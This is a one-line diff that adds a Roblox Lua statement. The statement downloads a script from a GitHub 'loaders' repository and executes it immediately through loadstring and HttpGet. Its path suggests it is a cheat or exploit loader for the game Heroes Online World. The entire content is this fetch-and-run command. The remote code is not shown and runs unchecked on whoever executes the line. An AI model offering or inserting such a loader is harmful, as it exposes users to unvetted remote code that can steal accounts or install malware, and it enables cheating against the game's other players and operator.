@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/dynamic-fix-heroes-online-world-spam7-qe6nipczfigl26.lua"))()
